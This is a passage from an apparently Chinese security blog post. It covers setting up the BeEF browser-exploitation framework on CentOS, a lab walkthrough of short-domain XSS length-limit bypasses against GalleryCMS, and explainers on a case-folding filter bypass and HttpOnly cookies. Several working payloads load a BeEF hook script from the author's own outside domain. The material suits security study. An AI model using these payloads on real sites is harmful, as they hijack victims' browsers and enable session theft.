checksum 报错，需要加参数–verify downloads 2，这个参数不一定有用，建议采用第三条代替</p>\n<p>3. 安装 ruby 时可能会非常非常～慢，需要先更改 rvm 源，其实就和你更改 yum 源为 ali 一样的道理</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">echo &quot;ruby_url=https://cache.ruby-china.com/pub/ruby&quot; &gt; /usr/local/rvm/user/db</span><br><span class=\"line\">注意： 最后的路径要取决于你的安装路径，比如我的就在  ~/.rvm/user/db</span><br><span class=\"line\">然后就可以安装 rvm install 2.7</span><br></pre></td></tr></table></figure>\n<p>4. 提示</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ERROR:  SSL verification error at depth 0: ok (0)</span><br><span class=\"line\">Error fetching https://ruby.taobao.org/:</span><br></pre></td></tr></table></figure>\n<p>更换 gem 源，参考链接<span class=\"exturl\" data-url=\"aHR0cHM6Ly9nZW1zLnJ1YnktY2hpbmEuY29tLw==\"> RubyGems 镜像 - Ruby China (ruby-china.com)</span></p>\n<p>5. 下载 beef  <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRsYWIuY29tL2thbGlsaW51eC9wYWNrYWdlcy9iZWVmLXhzcw==\">Kali Linux / Packages / beef-xss · GitLab</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2JlZWZwcm9qZWN0L2JlZWY=\">GitHub - beefproject/beef: The Browser Exploitation Framework Project</span></p>\n<p>建议使用第二个</p>\n<p>注意：下载此版本 ruby 版本必须 &gt; 3.0.3</p>\n<p>6. 报错 <code>There was an error while trying to write to /www/wwwroot/www.radsm.co/beef/beef-xss/.bundle/config. It is likely that you need to grant write permissions for that path.</code></p>\n<p>sudo 给对应的文件夹递归加权限即可</p>\n<p>7. 报错 <code>in autodetect': Could not find a JavaScript runtime.</code></p>\n<p>安装 nodejs 即可  <code>yum install nodejs</code></p>\n<p>8. 安装 bundle install 时非常慢，可以更新 bundle 源</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bundle config mirror.https://rubygems.org https://mirrors.tuna.tsinghua.edu.cn/rubygems</span><br></pre></td></tr></table></figure>\n<p>9. 显示 <code>/home/lighthouse/.rvm/gems/ruby-3.0.3@beef/gems/activerecord-7.0.3.1/lib/active_record/connection_adapters/sqlite3_adapter.rb:349:in check_version': Your version of SQLite (3.7.17) is too old. Active Record supports SQLite &gt;= 3.8. (RuntimeError)</code></p>\n<p>解决方法：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ wget https://kojipkgs.fedoraproject.org//packages/sqlite/3.8.11/1.fc21/x86_64/sqlite-devel-3.8.11-1.fc21.x86_64.rpm</span><br><span class=\"line\">$ wget https://kojipkgs.fedoraproject.org//packages/sqlite/3.8.11/1.fc21/x86_64/sqlite-3.8.11-1.fc21.x86_64.rpm</span><br><span class=\"line\">$ sudo yum install sqlite-3.8.11-1.fc21.x86_64.rpm sqlite-devel-3.8.11-1.fc21.x86_64.rpm</span><br></pre></td></tr></table></figure>\n<p>10. 报错</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[14:15:27][!] ERROR: Default username and password in use!</span><br><span class=\"line\">[14:15:27]    |_  Change the beef.credentials.passwd in config.yaml</span><br></pre></td></tr></table></figure>\n<p>解决方法：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo vim config.yaml   </span><br><span class=\"line\">更改默认密码</span><br></pre></td></tr></table></figure>\n<p>也可以参考一下这篇<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vZmVsaXh6aC9wLzgwODE2MjIuaHRtbA==\"> RVM 安装 Ruby - 大数据从业者 FelixZh - 博客园 (cnblogs.com)</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC8xMmQzMjI2ZDgzZWU=\">安装 rvm, 升级 ruby。跳的坑，做个记录 - 简书 (jianshu.com)</span></p>\n<p>但我明显碰到了更多奇奇怪怪的问题</p>\n<p>总结：不要再 centos 上安装 beef 会变得不幸</p>\n<h3 id=\"2使用4540或者20个字符绕过xss长度限制\"><a class=\"markdownIt-Anchor\" href=\"#2使用4540或者20个字符绕过xss长度限制\">#</a> 2. 使用 45,40，或者 20 个字符绕过 xss 长度限制</h3>\n<p>下面使用 gallerycms 进行测试，原因是它采用 jQuery 框架，可以测试某些情况下的最短 payload</p>\n<h3 id=\"21gallerycms安装\"><a class=\"markdownIt-Anchor\" href=\"#21gallerycms安装\">#</a> 2.1gallerycms 安装</h3>\n<p>1. 报错解决方法：</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220911001606531.png\" alt=\"image-20220911001606531\"></p>\n<p>1. 修改 \\application\\config\\database.php 中的数据库密码，并且创建对应数据库</p>\n<p>2. 切换 php 版本为 5.X，因为该 CMS 使用旧版的 CI 框架</p>\n<p>2. 随便注册，登录，此处的 Album Name 就是注入点</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220911001755992.png\" alt=\"image-20220911001755992\"></p>\n<h3 id=\"22使用短域名绕过字符限制\"><a class=\"markdownIt-Anchor\" href=\"#22使用短域名绕过字符限制\">#</a> 2.2 使用短域名绕过字符限制</h3>\n<p>短域名定义：通过 Unicode 编码使 Unicode 中一个字符被浏览器解析为两个或三个字符，最典型的有如下</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ﬀ expands to `ff`</span><br><span class=\"line\">℠ expands to `sm`</span><br><span class=\"line\">㏛ expands to `sr`</span><br><span class=\"line\">ﬆ expands to `st`</span><br><span class=\"line\">㎭ expands to `rad`</span><br><span class=\"line\">℡ expands to `tel`</span><br></pre></td></tr></table></figure>\n<p>因此我们就可以使用 Unicode 编码来缩短域名长度</p>\n<p>因此我注册了一个域名 <code>radsm.co</code> , 使用 Unicode 表示为 <code>㎭℠.co</code> 。相比之前减少了三个字符</p>\n<p>最极限的情况是使用 <code>℡℠.㎺</code> , 注意这里 pw 其实也是一个字符，我们可以只用四个字符构造一个域名，但我买的时候忘了 pw。。。。</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2ZpbGVkZXNjcmlwdG9yL1VuaWNvZGUtTWFwcGluZy1vbi1Eb21haW4tbmFtZXM=\">https://github.com/filedescriptor/Unicode-Mapping-on-Domain-names</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9qbGFqYXJhLmdpdGxhYi5pby93ZWIvMjAxOS8xMS8zMC9YU1NfMjBfY2hhcmFjdGVycy5odG1s\">https://jlajara.gitlab.io/web/2019/11/30/XSS_20_characters.html</span></p>\n<p>后来想起来不止这几个，其实极限域名甚至可以更短。。。</p>\n<h5 id=\"1没有禁止script标签的情况\"><a class=\"markdownIt-Anchor\" href=\"#1没有禁止script标签的情况\">#</a> 1. 没有禁止 script 标签的情况</h5>\n<p>使用 xsshunt 平台：</p>\n<p><code>&lt;script/src=https://㎭℠.xss.ht&gt;</code></p>\n<p>此时该 payload 为 30 个字符</p>\n<p>使用 beef-xss 平台</p>\n<p><code>&lt;script/src=http://㎭℠.co:3000/hook.js&gt;</code></p>\n<p>此时该 payload 为 30 个字符</p>\n<p>但注意：src 中不加 &quot;&quot; 也可以正常解析，同时不加协议也可以正常解析</p>\n<p>对于 xsshunter 平台，由于使用的是他的子域名，无法在变短，但我们可以使用域名重定向，将我们自己的域名重定向到 xsshunter 的域名</p>\n<p>注意：国内的域名不支持重定向</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220911004504679.png\" alt=\"image-20220911004504679\"></p>\n<p>对于 beef-xss 平台，由于 hook.js 这个路径太占长度，我们可以将 hook.js 写到 index.html 中，并且将网站使用默认端口省掉：3000 这些字符</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220911004816278.png\" alt=\"image-20220911004816278\"></p>\n<p>此时我们的极限 payload 为 <code>&lt;script/src=//㎭℠.㎺&gt;</code></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220911005113131.png\" alt=\"image-20220911005113131\"></p>\n<p>此时我们可以在 19 个长度内完成</p>\n<h5 id=\"2前端框架为jquery可以使用如下payload\"><a class=\"markdownIt-Anchor\" href=\"#2前端框架为jquery可以使用如下payload\">#</a> 2 前端框架为 jQuery，可以使用如下 payload：</h5>\n<p>不过滤 script 标签：</p>\n<p>注意此 payload 不能缺少 &quot;&quot; ，同样需要把 hook.js 放到 index.html 中</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;script&gt;$.getScript(&quot;//㎭℠.co&quot;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220911194433247.png\" alt=\"image-20220911194433247\"></p>\n<p>过滤 script 标签</p>\n<p>如果没有过滤 svg 标签。那么此时的 payload 为：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;svg/onload=$.getScript(&quot;//㎭℠.co&quot;)&gt;</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220911195539757.png\" alt=\"image-20220911195539757\"></p>\n<h5 id=\"3绕过gallerycms\"><a class=\"markdownIt-Anchor\" href=\"#3绕过gallerycms\">#</a> 3. 绕过 GalleryCMS</h5>\n<p>对于用户的输入，gallerycms 做了严格的过滤，包括 从长度和内容限制</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">add</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">  </span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">// Validate form.</span></span><br><span class=\"line\">    <span class=\"variable language_\">$this</span>-&gt;load-&gt;<span class=\"title function_ invoke__\">helper</span>(<span class=\"string\">&#x27;form&#x27;</span>);</span><br><span class=\"line\">    <span class=\"variable language_\">$this</span>-&gt;load-&gt;<span class=\"title function_ invoke__\">library</span>(<span class=\"string\">&#x27;form_validation&#x27;</span>);</span><br><span class=\"line\">    <span class=\"variable language_\">$this</span>-&gt;form_validation-&gt;<span class=\"title function_ invoke__\">set_error_delimiters</span>(<span class=\"string\">&#x27;&lt;div class=&quot;alert alert-error&quot;&gt;&lt;strong&gt;Error: &lt;/strong&gt;&#x27;</span>, <span class=\"string\">&#x27;&lt;/div&gt;&#x27;</span>);</span><br><span class=\"line\">    <span class=\"variable\">$user_data</span> = <span class=\"variable language_\">$this</span>-&gt;session-&gt;<span class=\"title function_ invoke__\">all_userdata</span>();</span><br><span class=\"line\">    <span class=\"variable language_\">$this</span>-&gt;form_validation-&gt;<span class=\"title function_ invoke__\">set_rules</span>(<span class=\"string\">&#x27;album_name&#x27;</span>, <span class=\"string\">&#x27;Album Name&#x27;</span>, <span class=\"string\">&#x27;trim|required|max_length[45]|xss_clean&#x27;</span>);</span><br><span class=\"line\">    ...</span><br></pre></td></tr></table></figure>\n<h6 id=\"假设没有xss_clean的绕过\"><a class=\"markdownIt-Anchor\" href=\"#假设没有xss_clean的绕过\">#</a> 假设没有 xss_clean 的绕过</h6>\n<p>注意：我买的域名被腾讯与搞了，无法解析，因此只能用一些奇技淫巧了</p>\n<p>比如：我虚拟机的 kali 的 ip 是 192.168.13.133，我的 gallerycms 部署在本机上，我在本机上 host 文件加一个 dns 解析，将 radsm.co 解析到 192.168.13.133</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220911201545877.png\" alt=\"image-20220911201545877\"></p>\n<p>但要是这样我 tm 白搭了一天的 beef…</p>\n<p>这样我们的 payload 就会变长，我使用的端口为 18888，<span class=\"exturl\" data-url=\"aHR0cDovL3huLS1yYWRzbS1ydDJoaTd6b21ydG9tYnBqY3EyaTNzemEuY286MTg4ODg=\">访问时就会变成 radsm.co:18888</span></p>\n<p>我们做一下减法 payload 会多出 6 个字符，到时候能解析的时候我们的 payload 就可以少六个</p>\n<p>1.payload 长度限制为 50 时</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;script&gt;$.getScript(&quot;//㎭℠.co&quot;)&lt;/script&gt;</span><br><span class=\"line\">payload 中&quot;&quot; 和后半个闭合标签都不能缺少</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220911231941383.png\" alt=\"image-20220911231941383\"></p>\n<p>2.payload 长度限制为 40 时</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;script src=//㎭℠.co&gt;&#x27;.length</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220911232202908.png\" alt=\"image-20220911232202908\"></p>\n<h6 id=\"存在xss_clean并且长度限制为45个字符时\"><a class=\"markdownIt-Anchor\" href=\"#存在xss_clean并且长度限制为45个字符时\">#</a> 存在 xss_clean 并且长度限制为 45 个字符时</h6>\n<p>利用 XSS_clean 漏过滤的 svg 来绕过</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;svg/onload=$.getScript(&quot;//㎭℠.co&quot;)&gt;</span><br></pre></td></tr></table></figure>\n<p>注意：如果此时在 index.html 内写入 hook.js，并且使用宝塔面板，一定记着把 bt 自己的初始页的东西删光，不然无法上线</p>\n<p>并且 bt 使用自己的默认 index.html 的，在 /www/server/panel 下，具体可以去 bt 看，这个也一定要删掉或者完全改写，否则不会访问你站点首页的自己的 index.html 的</p>\n<p>还有一件很诡异的事，我 gallerycms 搭建在本机 192.168.2.13 上，beef-xss 在 kali 192.168.13.133 上，在一样的 payload 前提下，在本机上始终无法上线，但在 kali 上就可以，本机上进行了域名和 ip 的尝试，始终不行，最后在 kali 访问本机的 gallerycms 成功上线</p>\n<p>补充:gallerycms 的对新建 album 的过滤在 application/controllers/album.php 中，修改长度在这个文件里就能修改前端限制</p>\n<p>+1 补充：本篇文件缺少一些 xss 的基础知识，如果看不懂先看<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDgxMTg1MS9hcnRpY2xlL2RldGFpbHMvMTI2MDgwNzI4\"> (49 条消息) XSS 详解及复现 gallerycms 字符长度限制短域名绕过_薄荷加冰心有多冷的博客 - CSDN 博客</span></p>\n<p>这个大佬写的文章</p>\n<h3 id=\"3通过特殊字符变为大写后长度变为原来两倍偷渡非法字符\"><a class=\"markdownIt-Anchor\" href=\"#3通过特殊字符变为大写后长度变为原来两倍偷渡非法字符\">#</a> 3. 通过特殊字符变为大写后长度变为原来两倍偷渡非法字符</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmh1bGkudHcvMjAyMi8wMi8wOC93aGF0LWktbGVhcm5lZC1mcm9tLWRpY2VjdGYtMjAyMi8=\">https://blog.huli.tw/2022/02/08/what-i-learned-from-dicectf-2022/</span></p>\n<p>假設我有個字串是  <code>ßßßßßßßß&lt;b&gt;1&lt;/b&gt;</code> ，長度是 16，所以在初始化的時候 length 會是 16，但是當跑到迴圈的時候因為轉成大寫，會是  <code>8*2+8</code>  = 24 個字，所以 24 個字會全部被寫進去 buf 裡面。</p>\n<p>在  <code>mock</code>  函式裡面，只會檢查 length 內的東西，所以最後 8 個字不會被檢查到，可以偷渡  <code>&lt;&gt;</code>  這些字元進去</p>\n<h3 id=\"4利用svgdetails绕过先抓取元素再赋值\"><a class=\"markdownIt-Anchor\" href=\"#4利用svgdetails绕过先抓取元素再赋值\">#</a> 4. 利用 SVG/details 绕过先抓取元素再赋值</h3>\n<p><code>document.querySelector( '.note').innerHTML = text;</code></p>\n<h2 id=\"补充httponly\"><a class=\"markdownIt-Anchor\" href=\"#补充httponly\">#</a> 补充：httponly</h2>\n<blockquote>\n<p>Cookie 分为内存 Cookie 和硬盘 Cookie，内存 Cookie 储存在浏览器内存中，关闭浏览器则消失。如果是想要利用保存在内存中的 Cookie，需要获取到用户 Cookie + 用户浏览器未关闭。如果是硬盘 Cookie，则该 Cookie 是一段时间有效的（有的时候我们登录网站会出现保持登录状态的选项，即保存在硬盘中），这类 Cookie 获取到后在其有效期内都是可以进行受害者用户身份登录的，进而实现入侵。</p>\n<p>Cookie 由变量名与值组成，其属性里有标准的 cookie 变量，也有用户自定义的属性。Cookie 保存在浏览器的 document 对象中，对于存在 XSS 漏洞的网站，入侵者可以插入简单的 XSS 语句执行任意的 JS 脚本，以 XSS 攻击的手段获取网站其余用户的 Cookie。</p>\n<p>比如，举个简单例子： <code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></p>\n<p>Cookie 是通过 http response header 种到浏览器的，设置 Cookie 的语法为：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Set-Cookie:=[;=][;expiress=][;domain=][;path=][;secure][;httponly]</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221029192451385.png\" alt=\"image-20221029192451385\"></p>\n<p>Cookie 各个参数详细内容：</p>\n<ul>\n<li>Set-Cookie:http 响应头，向客户端发送 Cookie。</li>\n<li>Name=value: 每个 Cookie 必须包含的内容。</li>\n<li>Expires=date:EXpires 确定了 Cookie 的有效终止日期，可选。如果缺省，则 Cookie 不保存在硬盘中，只保存在浏览器内存中。</li>\n<li>Domain=domain-name: 确定了哪些 inernet 域中的 web 服务器可读取浏览器储存的 Cookie，缺省为该 web 服务器域名。</li>\n<li>Path=path: 定义了 web 服务器哪些路径下的页面可获取服务器发送的 Cookie。</li>\n<li>Secure: 在 cookie 中标记该变量，表明只有为 https 通信协议时，浏览器才向服务器提交 Cookie。</li>\n<li><strong>Httponly: 禁止 javascript 读取，如果 cookie 中的一个参数带有 httponly，则这个参数将不能被 javascript 获取；httponly 可以防止 xss 会话劫持攻击。</strong></li>\n</ul>\n<p>有的网站为了防止 XSS，所以采用浏览器绑定技术，例如将 Cookie 和浏览器的 User-agent 进行绑定，一旦发现绑定不匹配则认为 Cookie 失效，但是这种方法存在很大的弊端，因为当入侵者获取到 Cookie 的同时也能获取到用户的 User-agent; 另一种防止 XSS 获取用户 Cookie 的方式是将 Cookie 和 Remote-addr 相绑定（即与 IP 绑定），但是这样的弊端是可能会带来极差的用户体验，如家里的 ADSL 拨号上网就是每次拨号连接更换一个 IP 地址。</p>\n<p>所以 HttpOnly 就应运而生了。<strong>具体含义就是，如果某个 Cookie 带有 HttpOnly 属性，那么这一条 Cookie 将被禁止读取，也就是说，JavaScript 读取不到此条 Cookie，不过在用户与服务端交互的时候，HttpRequest 包中仍然会带上这个 Cookie 信息，即用户与服务端的正常交互不受影响。如果支持 HttpOnly 的浏览器检测到包含 HttpOnly 标志的 cookie，并且客户端脚本代码尝试读取该 cookie，则浏览器将返回一个空字符串作为结果。</strong></p>\n<p>使用了 HttpOnly 只是在一定程度上抵御 XSS 盗取 Cookie 的行为，另外 HttpOnly 也不能防止入侵者做 AJAX 提交。严格来说 HttpOnly 并不是为了对抗 XSS，<strong>它解决的是 XSS 后的 Cookie 劫持问题</strong>，但是 XSS 攻击带来的不仅仅是 Cookie 劫持问题，还有窃取用户信息，模拟身份登录，操作用户账户等一系列问题。所以除了 HttpOnly 之外还需要其他的对抗解决方案。</p>\n</blockquote>\n<h2 id=\"参考\"><a class=\"markdownIt-Anchor\" href=\"#参考\">#</a> 参考</h2>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubGlhb3h1ZWZlbmcuY29tL3dpa2kvMTAyMjkxMDgyMTE0OTMxMg==\">JavaScript 教程 - 廖雪峰的官方网站 (liaoxuefeng.com)</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93YW5nZG9jLmNvbS9qYXZhc2NyaXB0Lw==\">JavaScript 教程 - 网道 (wangdoc.com)</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kZXZlbG9wZXIubW96aWxsYS5vcmcvemgtQ04vZG9jcy9XZWIvSmF2YVNjcmlwdA==\">JavaScript | MDN (mozilla.org)</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYm9va3N0YWNrLmNuL3JlYWQvamF2YXNjcmlwdC10dXRvcmlhbC9SRUFETUUubWQ=\">介绍 - 《阮一峰 JavaScript 教程》</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9yZXNlYXJjaC5zZWN1cml0dW0uY29tLw==\">research.securitum.com - securitum.com vulnerabilities researches and cyber security education publications</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubGVhdmVzb25ncy5jb20vUEVORVRSQVRJT04vamF2YXNjcmlwdC1wcm90b3R5cGUtcG9sbHV0aW9uLWF0dGFjay5odG1s\">深入理解 JavaScript Prototype 污染攻击 | 离别歌 (leavesongs.com)</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYW5xdWFua2UuY29tL3Bvc3QvaWQvMTU2MzU2\">实战 Web 缓存投毒（上）- 安全客 - 安全资讯平台 (anquanke.com)</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvcmVzZWFyY2gvcHJhY3RpY2FsLXdlYi1jYWNoZS1wb2lzb25pbmc=\">https://portswigger.net/research/practical-web-cache-poisoning</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly94c3MuYnkvI2NoZWF0c2hlZXQ=\">https://xss.by/#cheatsheet</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vQ2wwdWQvcC8xMzE5MDQxMy5odG1s\">XSS 漏洞防御之 HttpOnly - 春告鳥 - 博客园 (cnblogs.com)</span></p>\n",
            "tags": []
        }
    ]
}